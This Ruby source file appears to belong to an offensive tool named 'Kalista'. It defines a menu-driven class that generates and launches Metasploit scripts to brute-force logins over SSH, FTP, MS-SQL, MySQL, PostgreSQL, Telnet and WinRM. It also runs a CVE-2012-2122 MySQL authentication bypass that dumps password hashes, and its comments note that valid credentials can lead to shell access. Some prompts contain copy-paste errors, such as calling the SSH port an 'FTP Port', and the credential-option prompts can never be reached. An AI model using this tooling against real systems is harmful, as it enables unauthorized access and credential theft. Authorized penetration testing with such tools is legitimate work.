# This is our Logins & Bruteforcers Class
# This should house anything related to Login Scanners or Bruteforcing operations 
# If you add, just update the usage and r_shell function to make available

class LoginBrute
	def show_logins_usage
		puts "List of available commands and general description".light_yellow + ": ".white
		puts "\tcls".light_yellow + "         => ".white + "Clear Screen".light_yellow
		puts "\thelp ".light_yellow + "       => ".white + "Display this Help Menu".light_yellow
		puts "\tback ".light_yellow + "       => ".white + "Return to Main Menu".light_yellow
		puts "\texit ".light_yellow + "       => ".white + "Exit Completely".light_yellow
		print_line("")
		puts "\tssh ".light_yellow + "        => ".white + "SSH Login Scanner".light_yellow
		puts "\tftp_login ".light_yellow + "  => ".white + "FTP Login Scanner".light_yellow
		puts "\tftp_anon ".light_yellow + "   => ".white + "Anonymous FTP Login Scanner".light_yellow
		puts "\tmssql_login".light_yellow + " => ".white + "MS-SQL Login Scanner".light_yellow
		puts "\tpgsql_login".light_yellow + " => ".white + "PostgreSQL Login Scanner".light_yellow
		puts "\tmysql_login".light_yellow + " => ".white + "MySQL Login Scanner".light_yellow
		puts "\tmysql_auth".light_yellow + "  => ".white + "MySQL Authentication Bypass Password Dumper".light_yellow
		puts "\ttelnet ".light_yellow + "     => ".white + "Telnet Login Scanner".light_yellow
		puts "\twinrm ".light_yellow + "      => ".white + "WinRM Login Scanner".light_yellow
		print_line("")
	end

	def l_shell
		prompt = "(Logins)> "
		while line = Readline.readline("#{prompt}", true)
			cmd = line.chomp
			case cmd
				when /^clear|^cls|^banner/i
					cls
					banner
					l_shell
				when /^help|^h$|^ls$/i
					show_logins_usage
					l_shell
				when /^exit|^quit/i
					print_line("")
					print_error("OK, exiting Kalista....")
					print_line("")
					exit 69;
				when /^back|^main/i
					print_line("")
					print_error("OK, back to the Main Menu....")
					print_line("")
					$framework.core_shell
				when /^ssh/i
					print_line("")
					ssh_login_scan
					l_shell
				when /^ftp_login|^login_ftp/i
					print_line("")
					ftp_login_scan
					l_shell
				when /^ftp_anon|^anon_ftp/i
					print_line("")
					ftp_anon_scan
					l_shell
				when /^mssql_login|^login_mssql/i
					print_line("")
					mssql_login_scan
					l_shell
				when /^mysql_login|^login_mysql/i
					print_line("")
					mysql_login_scan
					l_shell
				when /^pgsql_login|^login_pgsql/i
					print_line("")
					pgsql_login_scan
					l_shell
				when /^mysql_auth|^auth_bypass|^mysql_bypass/i
					print_line("")
					mysql_auth_bypass
					l_shell
				when /^telnet/i
					print_line("")
					telnet_login_scan
					l_shell
				when /^winrm/i
					print_line("")
					winrm_login_scan
					l_shell
				else
					cls
					print_line("")
					print_error("Oops, Didn't quite understand that one")
					print_error("Please Choose a Valid Option From Menu Below Next Time.....")
					print_line("")
					show_logins_usage
					l_shell
				end
		end
	end

	# FTP Login Scanner
	# Just give it username(s) and password(s) to check and it will look for successful login credentials
	def ftp_login_scan
		print_status("FTP Login Scanner")
		print_caution("Target IP: ")
		zIP=gets.chomp

		print_caution("Use Standard FTP Port of 21 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("FTP Port: ")
			zPORT=gets.chomp
		else
			zPORT='21'
		end
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use auxiliary/scanner/ftp/ftp_login"
		f.puts "set RHOSTS #{zIP}"
		f.puts "set RPORT #{zPORT}"
		done=0
		while(true)
			print_caution("Select how to Scan for Logins: ")
			print_caution("1) Single User/Pass Combo across IP")
			print_caution("2) User & Password Files for Bruteforce Scanning IP")
			answer=gets.chomp
			if answer.to_i == 1
				print_caution("Please provide Username: ")
				pgUser=gets.chomp

				print_caution("Please provide Password: ")
				pgPass=gets.chomp
				f.puts "set USERNAME #{pgUser}"
				f.puts "set PASSWORD #{pgPass}"
				done=1
				break
			elsif answer.to_i == 2
				while(true)
					print_caution("Location of Password File to use: ")
					passfile=gets.chomp
					if File.exists?(passfile)
						break
					else
						print_error("")
						print_error("Can't find provided file!")
						print_error("Please check path or permissions and try again....")
						print_error("")
					end
				end
				while(true)
					print_caution("Location of Username File to use: ")
					userfile=gets.chomp
					if File.exists?(userfile)
						break
					else
						print_error("")
						print_error("Can't find provided file!")
						print_error("Please check path or permissions and try again....")
						print_error("")
					end
				end
				f.puts "set USER_FILE #{userfile}"
				f.puts "set PASS_FILE #{passfile}"
				done=1
				break
			else
				print_error("")
				print_error("Please choose a valid option!")
				print_error("")
			end
			if done.to_i > 0
				print_caution("Do you want to try blank passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set BLANK_PASSWORDS false"
				end

				print_caution("Do you want to try username as passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set USER_AS_PASS false"
				end
				break
			end
		end
		print_status("Launching MSF FTP Login Scanner against #{zIP}:#{zPORT} in a new x-window.....")
		f.puts "set THREADS 10"
		f.puts 'run'
		f.close
		xftp="xterm -title 'FTP Login Scanner' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(xftp)
		print_status("")
	end

	# FTP Anonymous Login
	# Simple check for FTP Servers which do not require any authentication
	def ftp_anon_scan
		print_status("Anonymous FTP Login Scanner")
		print_caution("Target IP: ")
		zIP=gets.chomp

		print_caution("Use Standard FTP Port of 21 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("FTP Port: ")
			zPORT=gets.chomp
		else
			zPORT='21'
		end
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use scanner/ftp/anonymous"
		f.puts "set RHOSTS #{zIP}"
		f.puts "set RPORT #{zPORT}"

		print_status("Launching MSF FTP Anonymous Login Check Scanner against #{zIP}:#{zPORT} in a new x-window.....")
		f.puts "set THREADS 10"
		f.puts 'run'
		f.close
		anonftp="xterm -title 'FTP Anonymous Login Scanner' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(anonftp)
		print_line("")
	end

	# Simple MS-SQL Login Scanner
	# Use the mssql_ping tool in RECON section if you need to determine which port the MS-SQL Server is listening on, standard port is 1433
	# Finding valid creds on MS-SQL usually means shell access!
	def mssql_login_scan
		print_status("MS-SQL Login Scanner")
		print_caution("Target IP: ")
		zIP=gets.chomp

		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use auxiliary/scanner/mssql/mssql_login"
		f.puts "set RHOSTS #{zIP}"
		done=0
		while(true)
			print_caution("Select how to Scan for Logins: ")
			print_caution("1) Single User/Pass Combo across IP")
			print_caution("2) User & Password Files for Bruteforce Scanning IP")
			answer=gets.chomp
			if answer.to_i == 1
				print_caution("Please provide Username: ")
				pgUser=gets.chomp

				print_caution("Please provide Password: ")
				pgPass=gets.chomp
				f.puts "set USERNAME #{pgUser}"
				f.puts "set PASSWORD #{pgPass}"
				done=1
				break
			elsif answer.to_i == 2
				while(true)
					print_caution("Location of Password File to use: ")
					passfile=gets.chomp
					if File.exists?(passfile)
						break
					else
						print_error("")
						print_error("Can't find provided file!")
						print_error("Please check path or permissions and try again....")
						print_error("")
					end
				end
				while(true)
					print_caution("Location of Username File to use: ")
					userfile=gets.chomp
					if File.exists?(userfile)
						break
					else
						print_error("")
						print_error("Can't find provided file!")
						print_error("Please check path or permissions and try again....")
						print_error("")
					end
				end
				f.puts "set USER_FILE #{userfile}"
				f.puts "set PASS_FILE #{passfile}"
				done=1
				break
			else
				print_error("")
				print_error("Please choose a valid option!")
				print_error("")
			end
			if done.to_i > 0
				print_caution("Do you want to try blank passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set BLANK_PASSWORDS false"
				end

				print_caution("Do you want to try username as passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set USER_AS_PASS false"
				end
				break
			end
		end
		print_status("Launching MS-SQL Login Scanner against #{zIP} in a new x-window.....")
		f.puts "set THREADS 5"
		f.puts 'run'
		f.close
		mssql="xterm -title 'MS-SQL Login Scanner' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(mssql)
		print_line("")
	end

	# Simple MySQL Login Scanner
	# Just give it username(s) and password(s) to check and it will look for successful login credentials
	def mysql_login_scan
		print_status("MySQL Login Scanner")
		print_caution("Target IP: ")
		zIP=gets.chomp

		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use scanner/mysql/mysql_login"
		f.puts "set RHOSTS #{zIP}"
		done=0
		while(true)
			print_caution("Select how to Scan for Logins: ")
			print_caution("1) Single User/Pass Combo across IP")
			print_caution("2) User & Password Files for Bruteforce Scanning IP")
			answer=gets.chomp
			if answer.to_i == 1
				print_caution("Please provide Username: ")
				pgUser=gets.chomp

				print_caution("Please provide Password: ")
				pgPass=gets.chomp
				f.puts "set USERNAME #{pgUser}"
				f.puts "set PASSWORD #{pgPass}"
				done=1
				break
			elsif answer.to_i == 2
				while(true)
					print_caution("Location of Password File to use: ")
					passfile=gets.chomp
					puts
					if File.exists?(passfile)
						break
					else
						print_error("")
						print_error("Can't find provided file!")
						print_error("Please check path or permissions and try again....")
						print_error("")
					end
				end
				while(true)
					print_caution("Location of Username File to use: ")
					userfile=gets.chomp
					if File.exists?(userfile)
						break
					else
						print_error("")
						print_error("Can't find provided file!")
						print_error("Please check path or permissions and try again....")
						print_error("")
					end
				end
				f.puts "set USER_FILE #{userfile}"
				f.puts "set PASS_FILE #{passfile}"
				done=1
				break
			else
				print_error("")
				print_error("Please choose a valid option!")
				print_error("")
			end
			if done.to_i > 0
				print_caution("Do you want to try blank passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set BLANK_PASSWORDS false"
				end

				print_caution("Do you want to try username as passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set USER_AS_PASS false"
				end
				break
			end
		end
		print_status("Launching MSF MySQL Login Check Scanner against #{zIP} in a new x-window.....")
		f.puts "set THREADS 5"
		f.puts 'run'
		f.close
		mssql="xterm -title 'MySQL Login Scanner' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(mssql)
		print_line("")
	end

	# Simple PostgreSQL Login Scanner
	# Just give it username(s) and password(s) to check and it will look for successful login credentials
	# Possible to execuute commands with valid creds so can be useful!
	def pgsql_login_scan
		print_status("PostgreSQL Login Scanner")
		print_caution("Target IP: ")
		zIP=gets.chomp

		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use auxiliary/scanner/postgres/postgres_login"
		f.puts "set RHOSTS #{zIP}"
		done=0
		while(true)
			print_caution("Select how to Scan for Logins: ")
			print_caution("1) Single User/Pass Combo across IP")
			print_caution("2) User & Password Files for Bruteforce Scanning IP")
			answer=gets.chomp
			if answer.to_i == 1
				print_caution("Please provide Username: ")
				pgUser=gets.chomp

				print_caution("Please provide Password: ")
				pgPass=gets.chomp
				f.puts "set USERNAME #{pgUser}"
				f.puts "set PASSWORD #{pgPass}"
				done=1
				break
			elsif answer.to_i == 2
				while(true)
					print_caution("Location of Password File to use: ")
					passfile=gets.chomp
					puts
					if File.exists?(passfile)
						break
					else
						print_error("")
						print_error("Can't find provided file!")
						print_error("Please check path or permissions and try again....")
						print_error("")
					end
				end
				while(true)
					print_caution("Location of Username File to use: ")
					userfile=gets.chomp
					if File.exists?(userfile)
						break
					else
						print_error("")
						print_error("Can't find provided file!")
						print_error("Please check path or permissions and try again....")
						print_error("")
					end
				end
				f.puts "set USER_FILE #{userfile}"
				f.puts "set PASS_FILE #{passfile}"
				done=1
				break
			else
				print_error("")
				print_error("Please choose a valid option!")
				print_error("")
			end
			if done.to_i > 0
				print_caution("Do you want to try blank passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set BLANK_PASSWORDS false"
				end

				print_caution("Do you want to try username as passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set USER_AS_PASS false"
				end
				break
			end
		end
		print_status("Launching MSF PostgreSQL Login Check Scanner against #{zIP} in a new x-window.....")
		f.puts "set THREADS 5"
		f.puts 'run'
		f.close
		pgsql="xterm -title 'PostgreSQL Login Scanner' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(pgsql)
		print_line("")
	end

	# SSH Login Scanner
	# Just give it username(s) and password(s) to check and it will look for successful login credentials
	def ssh_login_scan
		print_status("SSH Login Scanner")
		print_caution("Target IP or IP Range: ")
		zIP=gets.chomp

		print_caution("Use Standard FTP Port of 22 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Port: ")
			zPORT=gets.chomp
		else
			zPORT='22'
		end
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use auxiliary/scanner/ssh/ssh_login"
		f.puts "set RHOSTS #{zIP}"
		f.puts "set RPORT #{zPORT}"
		done=0
		while(true)
			print_caution("Select how to Scan for Logins: ")
			print_caution("1) Single Username & Password")
			print_caution("2) Username & Password Files")
			answer=gets.chomp
			if answer.to_i == 1
				print_caution("Please provide Username: ")
				pgUser=gets.chomp

				print_caution("Please provide Password: ")
				pgPass=gets.chomp
				f.puts "set USERNAME #{pgUser}"
				f.puts "set PASSWORD #{pgPass}"
				done=1
				break
			elsif answer.to_i == 2
				print_caution("Please provide Username: ")
				pgUser=gets.chomp
				while(true)
					print_caution("Location of Password File to use: ")
					passfile=gets.chomp
					if File.exists?(passfile)
						break
					else
						print_error("")
						print_error("Can't find provided file!")
						print_error("Please check path or permissions and try again....")
						print_error("")
					end
				end
				f.puts "set USERNAME #{pgUser}"
				f.puts "set PASS_FILE #{passfile}"
				done=1
				break
			else
				print_error("")
				print_error("Please choose a valid option!")
				print_error("")
			end
			if done.to_i > 0
				print_caution("Do you want to try blank passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set BLANK_PASSWORDS false"
				end

				print_caution("Do you want to try the username as password (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set USER_AS_PASS false"
				end
				break
			end
		end
		print_status("Launching MSF SSH Login Scanner against #{zIP}:#{zPORT} in a new x-window.....")
		f.puts "set THREADS 5"
		f.puts 'run'
		f.close
		xssh="xterm -title 'SSH Login Scanner' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(xssh)
		print_status("")
	end

	# CVE-2012-2122  MySQL Authentication Bypass Exploit is abused and on success the MySQL users table is dumped with focus on password credentials
	# sql/password.c in Oracle MySQL 5.1.x before 5.1.63, 5.5.x before 5.5.24, and 5.6.x before 5.6.6, and MariaDB 5.1.x before 5.1.62, 5.2.x before 5.2.12, 5.3.x before 5.3.6, and 5.5.x before 5.5.23, when running in certain environments with certain implementations of the memcmp function, allows remote attackers to bypass authentication by repeatedly authenticating with the same incorrect password, which eventually causes a token comparison to succeed due to an improperly-checked return value.
	def mysql_auth_bypass
		print_status("")
		print_status("MySQL Authentication Bypass Password Dumper")
		print_status("")
		print_caution("Target IP or IP Range: ")
		zIP=gets.chomp

		print_caution("Use Standard MySQL Port of 3306 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Port: ")
			zPORT=gets.chomp
		else
			zPORT='3306'
		end
		print_caution("Provide Username to target (recommend: root): ")
		zUSER=gets.chomp

		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use auxiliary/scanner/mysql/mysql_authbypass_hashdump"
		f.puts "set RHOSTS #{zIP}"
		f.puts "set RPORT #{zPORT}"
		f.puts "set USERNAME #{zUSER}"
		f.puts "set THREADS 5"
		f.puts 'run'
		f.close

		print_status("Launching MySQL Auth Bypass Scanner & Dumper against #{zIP}:#{zPORT} in a new x-window.....")
		myauthb="xterm -title 'MySQL Auth Bypass Scanner' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(myauthb)
		print_status("")
	end

	# Simple MSF Telnet Login Scanner Wrapper
	# Give it username and password or passlist and let it check....
	def telnet_login_scan
		print_status("Telnet Login Scanner")
		print_caution("Target IP or IP Range: ")
		zIP=gets.chomp

		print_caution("Use Standard FTP Port of 23 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Port: ")
			zPORT=gets.chomp
		else
			zPORT='23'
		end
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use auxiliary/scanner/telnet/telnet_login"
		f.puts "set RHOSTS #{zIP}"
		f.puts "set RPORT #{zPORT}"
		done=0
		while(true)
			print_caution("Select how to Scan for Logins: ")
			print_caution("1) Single Username & Password")
			print_caution("2) Username & Password Files")
			answer=gets.chomp
			if answer.to_i == 1
				print_caution("Please provide Username: ")
				pgUser=gets.chomp

				print_caution("Please provide Password: ")
				pgPass=gets.chomp
				f.puts "set USERNAME #{pgUser}"
				f.puts "set PASSWORD #{pgPass}"
				done=1
				break
			elsif answer.to_i == 2
				print_caution("Please provide Username: ")
				pgUser=gets.chomp
				while(true)
					print_caution("Location of Password File to use: ")
					passfile=gets.chomp
					if File.exists?(passfile)
						break
					else
						print_error("")
						print_error("Can't find provided file!")
						print_error("Please check path or permissions and try again....")
						print_error("")
					end
				end
				f.puts "set USERNAME #{pgUser}"
				f.puts "set PASS_FILE #{passfile}"
				done=1
				break
			else
				print_error("")
				print_error("Please choose a valid option!")
				print_error("")
			end
			if done.to_i > 0
				print_caution("Do you want to try blank passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set BLANK_PASSWORDS false"
				end

				print_caution("Do you want to try the username as password (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set USER_AS_PASS false"
				end
				break
			end
		end
		print_status("Launching MSF Telnet Login Scanner against #{zIP}:#{zPORT} in a new x-window.....")
		f.puts "set THREADS 5"
		f.puts 'run'
		f.close
		xtel="xterm -title 'Telnet Login Scanner' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(xtel)
		print_status("")
	end

	# MSF WinRM Login Utility
	# This module attempts to authenticate to a WinRM service. It currently works only if the remote end allows Negotiate(NTLM) authentication. 
	# Kerberos is not currently supported!
	#If successful you can use the exploit winrm option to use credentials to execute commands through winrm service, this only tests for valid creds...
	def winrm_login_scan
		print_status("WinRM Login Scanner")
		print_caution("Target IP or IP Range: ")
		zIP=gets.chomp

		print_caution("Set Domain (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'Y' or answer.upcase == 'YES'
			print_caution("Domain to use: ")
			zDOMAIN=gets.chomp
		else
			zDOMAIN='WORKSTATION'
		end

		print_caution("Use Standard WinRM HTTP API Port of 5985 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Port: ")
			zPORT=gets.chomp
		else
			zPORT='5985'
		end

		print_caution("Use standard URI /wsman (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("URI to use: ")
			zURI=gets.chomp
		else
			zURI='/wsman'
		end

		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use auxiliary/scanner/winrm/winrm_login"
		f.puts "set RHOSTS #{zIP}"
		f.puts "set RPORT #{zPORT}"
		f.puts "set DOMAIN #{zDOMAIN}"
		f.puts "set URI #{zURI}"
		done=0
		while(true)
			print_caution("Select how to Scan for Logins: ")
			print_caution("1) Single Username & Password")
			print_caution("2) Username & Password Files")
			answer=gets.chomp
			if answer.to_i == 1
				print_caution("Please provide Username: ")
				pgUser=gets.chomp

				print_caution("Please provide Password: ")
				pgPass=gets.chomp
				f.puts "set USERNAME #{pgUser}"
				f.puts "set PASSWORD #{pgPass}"
				done=1
				break
			elsif answer.to_i == 2
				print_caution("Please provide Username: ")
				pgUser=gets.chomp
				while(true)
					print_caution("Location of Password File to use: ")
					passfile=gets.chomp
					if File.exists?(passfile)
						break
					else
						print_error("")
						print_error("Can't find provided file!")
						print_error("Please check path or permissions and try again....")
						print_error("")
					end
				end
				f.puts "set USERNAME #{pgUser}"
				f.puts "set PASS_FILE #{passfile}"
				done=1
				break
			else
				print_error("")
				print_error("Please choose a valid option!")
				print_error("")
			end
			if done.to_i > 0
				print_caution("Do you want to try blank passwords (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set BLANK_PASSWORDS false"
				end

				print_caution("Do you want to try the username as password (Y/N)?")
				answer=gets.chomp
				if answer.upcase == 'N' or answer.upcase == 'NO'
					f.puts "set USER_AS_PASS false"
				end
				break
			end
		end
		f.puts 'run'
		f.close
		print_status("Launching MSF WinRM Login Scanner against #{zIP}:#{zPORT} in a new x-window.....")
		xwinrm="xterm -title 'WinRM Login Scanner' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(xwinrm)
		print_status("")
	end
end
